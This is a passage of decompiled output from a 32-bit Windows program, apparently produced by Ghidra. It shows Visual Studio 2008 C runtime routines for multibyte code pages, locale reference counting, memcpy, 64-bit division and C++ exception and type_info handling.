  uVar5 = uVar5 + 0x30;
  if (0xef < uVar5) goto code_r0x0040bfd6;
  goto LAB_0040bfbd;
code_r0x0040bfd6:
  if (((uVar4 == 65000) || (uVar4 == 0xfde9)) ||
     (BVar6 = IsValidCodePage(uVar4 & 0xffff), BVar6 == 0)) goto LAB_0040c155;
  BVar6 = GetCPInfo(uVar4,&local_1c);
  if (BVar6 != 0) {
    _memset((void *)(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar11 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar11;
          if (bVar3 == 0) break;
          for (uVar4 = (uint)pBVar11[-1]; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
            pbVar8 = (byte *)(param_2 + 0x1d + uVar4);
            *pbVar8 = *pbVar8 | 4;
          }
          pBVar1 = pBVar11 + 1;
          pBVar11 = pBVar11 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar8 = (byte *)(param_2 + 0x1e);
      iVar10 = 0xfe;
      do {
        *pbVar8 = *pbVar8 | 8;
        pbVar8 = pbVar8 + 1;
        iVar10 = iVar10 + -1;
      } while (iVar10 != 0);
      iVar10 = CPtoLCID((int)unaff_EDI);
      *(int *)(param_2 + 0xc) = iVar10;
      *(undefined4 *)(param_2 + 8) = extraout_EDX;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_0040c0ee:
    setSBUpLow(unaff_EDI);
    goto LAB_0040c155;
  }
  if (DAT_00419a14 == 0) goto LAB_0040c155;
  goto LAB_0040bfaa;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __setmbcp
// 
// Library: Visual Studio 2008 Release

int __cdecl __setmbcp(int _CodePage)

{
  _ptiddata p_Var1;
  int iVar2;
  pthreadmbcinfo ptVar3;
  LONG LVar4;
  int *piVar5;
  int iVar6;
  pthreadmbcinfo ptVar7;
  pthreadmbcinfo ptVar8;
  int in_stack_ffffffc8;
  int local_24;
  
  local_24 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar3 = p_Var1->ptmbcinfo;
  iVar2 = getSystemCP(in_stack_ffffffc8);
  if (iVar2 == ptVar3->mbcodepage) {
    local_24 = 0;
  }
  else {
    ptVar3 = (pthreadmbcinfo)__malloc_crt(0x220);
    if (ptVar3 != (pthreadmbcinfo)0x0) {
      ptVar7 = p_Var1->ptmbcinfo;
      ptVar8 = ptVar3;
      for (iVar6 = 0x88; iVar6 != 0; iVar6 = iVar6 + -1) {
        ptVar8->refcount = ptVar7->refcount;
        ptVar7 = (pthreadmbcinfo)&ptVar7->mbcodepage;
        ptVar8 = (pthreadmbcinfo)&ptVar8->mbcodepage;
      }
      ptVar3->refcount = 0;
      local_24 = __setmbcp_nolock(iVar2,(int)ptVar3);
      if (local_24 == 0) {
        LVar4 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar4 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_004184c0)) {
          _free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar3;
        InterlockedIncrement((LONG *)ptVar3);
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_004189e4 & 1) == 0)) {
          __lock(0xd);
          _DAT_00419a24 = ptVar3->mbcodepage;
          _DAT_00419a28 = ptVar3->ismbcodepage;
          _DAT_00419a2c = *(undefined4 *)ptVar3->mbulinfo;
          for (iVar2 = 0; iVar2 < 5; iVar2 = iVar2 + 1) {
            (&DAT_00419a18)[iVar2] = ptVar3->mbulinfo[iVar2 + 2];
          }
          for (iVar2 = 0; iVar2 < 0x101; iVar2 = iVar2 + 1) {
            (&DAT_004186e0)[iVar2] = ptVar3->mbctype[iVar2 + 4];
          }
          for (iVar2 = 0; iVar2 < 0x100; iVar2 = iVar2 + 1) {
            (&DAT_004187e8)[iVar2] = ptVar3->mbcasemap[iVar2 + 4];
          }
          LVar4 = InterlockedDecrement((LONG *)PTR_DAT_004188e8);
          if ((LVar4 == 0) && (PTR_DAT_004188e8 != &DAT_004184c0)) {
            _free(PTR_DAT_004188e8);
          }
          PTR_DAT_004188e8 = (undefined *)ptVar3;
          InterlockedIncrement((LONG *)ptVar3);
          FUN_0040c2c5();
        }
      }
      else if (local_24 == -1) {
        if (ptVar3 != (pthreadmbcinfo)&DAT_004184c0) {
          _free(ptVar3);
        }
        piVar5 = __errno();
        *piVar5 = 0x16;
      }
    }
  }
  return local_24;
}



void FUN_0040c2c5(void)

{
  FUN_0040a124(0xd);
  return;
}



// Library Function - Single Match
//  ___initmbctable
// 
// Library: Visual Studio 2008 Release

undefined4 ___initmbctable(void)

{
  if (DAT_0041b3ec == 0) {
    __setmbcp(-3);
    DAT_0041b3ec = 1;
  }
  return 0;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2008 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  int **ppiVar3;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0xbc) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0xbc) != &PTR_DAT_00418ec8)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppuVar2 = *(undefined ***)(void **)((int)param_1 + 0xd4);
  if ((ppuVar2 != &PTR_DAT_00418e08) && (ppuVar2[0x2d] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  ppiVar3 = (int **)((int)param_1 + 0x50);
  param_1 = (void *)0x6;
  do {
    if (((ppiVar3[-2] != (int *)&DAT_004189e8) && (piVar1 = *ppiVar3, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((ppiVar3[-1] != (int *)0x0) && (piVar1 = ppiVar3[1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    ppiVar3 = ppiVar3 + 4;
    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  _free(_Memory);
  return;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2008 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar2 = (LONG **)(param_1 + 0x14);
  param_1 = (LONG *)0x6;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_004189e8) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2008 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar2 = (LONG **)(param_1 + 0x14);
    param_1 = (LONG *)0x6;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_004189e8) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2008 Release

LONG * __updatetlocinfoEx_nolock(void)

{
  LONG *pLVar1;
  LONG **in_EAX;
  LONG *unaff_EDI;
  
  if ((unaff_EDI != (LONG *)0x0) && (in_EAX != (LONG **)0x0)) {
    pLVar1 = *in_EAX;
    if (pLVar1 != unaff_EDI) {
      *in_EAX = unaff_EDI;
      ___addlocaleref(unaff_EDI);
      if (pLVar1 != (LONG *)0x0) {
        ___removelocaleref(pLVar1);
        if ((*pLVar1 == 0) && (pLVar1 != (LONG *)&DAT_004189f0)) {
          ___freetlocinfo(pLVar1);
        }
      }
    }
    return unaff_EDI;
  }
  return (LONG *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2008 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_004189e4) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    __updatetlocinfoEx_nolock();
    FUN_0040c635();
  }
  else {
    p_Var1 = __getptd();
    p_Var1 = (_ptiddata)p_Var1->ptlocinfo;
  }
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x20);
  }
  return (pthreadlocinfo)p_Var1;
}



void FUN_0040c635(void)

{
  FUN_0040a124(0xc);
  return;
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  CHAR CVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    CVar3 = (CHAR)_C;
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = CVar3;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = CVar3;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,
                       (BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// Library Function - Single Match
//  _memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0040c8e3_caseD_2;
        case 3:
          goto switchD_0040c8e3_caseD_3;
        }
        goto switchD_0040c8e3_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0040c8e3_caseD_0;
      case 1:
        goto switchD_0040c8e3_caseD_1;
      case 2:
        goto switchD_0040c8e3_caseD_2;
      case 3:
        goto switchD_0040c8e3_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040c8e3_caseD_2;
            case 3:
              goto switchD_0040c8e3_caseD_3;
            }
            goto switchD_0040c8e3_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040c8e3_caseD_2;
            case 3:
              goto switchD_0040c8e3_caseD_3;
            }
            goto switchD_0040c8e3_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040c8e3_caseD_2;
            case 3:
              goto switchD_0040c8e3_caseD_3;
            }
            goto switchD_0040c8e3_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0040c8e3_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_0040c8e3_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_0040c8e3_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return _Dst;
    }
switchD_0040c8e3_caseD_0:
    return _Dst;
  }
  if (((0xff < _Size) && (DAT_0041a2b0 != 0)) && (((uint)_Dst & 0xf) == ((uint)_Src & 0xf))) {
    puVar1 = __VEC_memcpy((undefined4 *)_Dst,(undefined4 *)_Src,_Size);
    return puVar1;
  }
  puVar1 = (undefined4 *)_Dst;
  if (((uint)_Dst & 3) == 0) {
    uVar2 = _Size >> 2;
    uVar3 = _Size & 3;
    if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *_Src;
        _Src = (undefined4 *)((int)_Src + 4);
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return _Dst;
      case 2:
        goto switchD_0040c75c_caseD_2;
      case 3:
        goto switchD_0040c75c_caseD_3;
      }
      goto switchD_0040c75c_caseD_1;
    }
  }
  else {
    switch(_Size) {
    case 0:
      goto switchD_0040c75c_caseD_0;
    case 1:
      goto switchD_0040c75c_caseD_1;
    case 2:
      goto switchD_0040c75c_caseD_2;
    case 3:
      goto switchD_0040c75c_caseD_3;
    default:
      uVar2 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 1:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar1 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c75c_caseD_2;
          case 3:
            goto switchD_0040c75c_caseD_3;
          }
          goto switchD_0040c75c_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar1 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c75c_caseD_2;
          case 3:
            goto switchD_0040c75c_caseD_3;
          }
          goto switchD_0040c75c_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar2) {
                    // WARNING: Load size is inaccurate
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040c75c_caseD_2;
          case 3:
            goto switchD_0040c75c_caseD_3;
          }
          goto switchD_0040c75c_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = *(undefined4 *)((int)_Src + (uVar2 - 7) * 4);
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = *(undefined4 *)((int)_Src + (uVar2 - 6) * 4);
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = *(undefined4 *)((int)_Src + (uVar2 - 5) * 4);
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = *(undefined4 *)((int)_Src + (uVar2 - 4) * 4);
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = *(undefined4 *)((int)_Src + (uVar2 - 3) * 4);
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = *(undefined4 *)((int)_Src + (uVar2 - 2) * 4);
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = *(undefined4 *)((int)_Src + (uVar2 - 1) * 4);
    _Src = (void *)((int)_Src + uVar2 * 4);
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0040c75c_caseD_1:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    return _Dst;
  case 2:
switchD_0040c75c_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_0040c75c_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar1 = *_Src;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_0040c75c_caseD_0:
  return _Dst;
}



// Library Function - Single Match
//  __aulldiv
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined8 __aulldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  size_t sVar1;
  char *_Dst;
  
  *(undefined ***)this = vftable;
  if (*param_1 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar1 = _strlen(*param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,*param_1);
    }
  }
  *(undefined4 *)(this + 8) = 1;
  return this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  char *pcVar1;
  
  *(undefined ***)this = vftable;
  pcVar1 = *param_1;
  *(undefined4 *)(this + 8) = 0;
  *(char **)(this + 4) = pcVar1;
  return;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2008 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  int iVar1;
  size_t sVar2;
  char *pcVar3;
  
  *(undefined ***)this = vftable;
  iVar1 = *(int *)(param_1 + 8);
  *(int *)(this + 8) = iVar1;
  pcVar3 = *(char **)(param_1 + 4);
  if (iVar1 == 0) {
    *(char **)(this + 4) = pcVar3;
  }
  else if (pcVar3 == (char *)0x0) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    sVar2 = _strlen(pcVar3);
    pcVar3 = (char *)_malloc(sVar2 + 1);
    *(char **)(this + 4) = pcVar3;
    if (pcVar3 != (char *)0x0) {
      _strcpy_s(pcVar3,sVar2 + 1,*(char **)(param_1 + 4));
    }
  }
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall exception::~exception(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall exception::~exception(exception *this)

{
  *(undefined ***)this = std::exception::vftable;
  if (*(int *)(this + 8) != 0) {
    _free(*(void **)(this + 4));
  }
  return;
}



char * __fastcall FUN_0040cbbb(int param_1)

{
  char *pcVar1;
  
  pcVar1 = *(char **)(param_1 + 4);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "Unknown exception";
  }
  return pcVar1;
}



exception * __thiscall FUN_0040cbc8(void *this,byte param_1)

{
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_00406bc9(this);
  }
  return (exception *)this;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined ***)this = vftable;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    FUN_00406bc9(this);
  }
  return this;
}



// Library Function - Single Match
//  public: bool __thiscall type_info::operator==(class type_info const &)const 
// 
// Library: Visual Studio 2008 Release

bool __thiscall type_info::operator==(type_info *this,type_info *param_1)

{
  int iVar1;
  
  iVar1 = _strcmp((char *)(param_1 + 9),(char *)(this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __onexit_nolock(int param_1)

{
  int *_Memory;
  int *piVar1;
  size_t sVar2;
  size_t sVar3;
  void *pvVar4;
  int iVar5;
  
  _Memory = (int *)__decode_pointer(DAT_0041b3e8);
  piVar1 = (int *)__decode_pointer(DAT_0041b3e4);
  if ((piVar1 < _Memory) || (iVar5 = (int)piVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return 0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
